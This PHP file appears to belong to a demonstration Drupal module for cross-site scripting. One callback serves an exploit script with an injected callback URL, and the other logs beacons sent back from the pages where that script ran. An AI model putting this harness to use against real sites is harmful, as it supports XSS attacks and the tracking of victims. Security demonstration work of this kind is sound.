<?php
/**
 * @file
 * Page callbacks for the XSS Example module.
 */

/**
 * Page callback for the exploit JavaScript file.
 */
function drupal_xss_example_exploit_page() {
  global $base_url;

  $options = array(
    'callback_url' => url('drupal_xss_example/callback', array('absolute' => TRUE)),
  );
  $options_json = drupal_json_encode($options);
  $javascript_path = drupal_get_path('module', 'drupal_xss_example') . '/exploit.js';

  if (ob_get_level()) {
    ob_end_clean();
  }

  drupal_add_http_header('Content-Type', 'text/javascript');
  drupal_send_headers();

  print "var drupal_xss_example_options = $options_json;\n\n";
  $fd = fopen($javascript_path, 'rt');
  while (!feof($fd)) {
    print fread($fd, 1024);
  }
  fclose($fd);

  drupal_exit();
}

/**
 * Page callback for the scripts callback to master.
 */
function drupal_xss_example_callback_page() {
  $origin = $_GET['origin'];
  $message = $_GET['message'];
  $link = isset($_GET['link']) ? $_GET['link'] : NULL;

  watchdog('drupal_xss_example', 'Callback from @origin: %message', array('@origin' => $origin, '%message' => $message), WATCHDOG_NOTICE, $link);
}
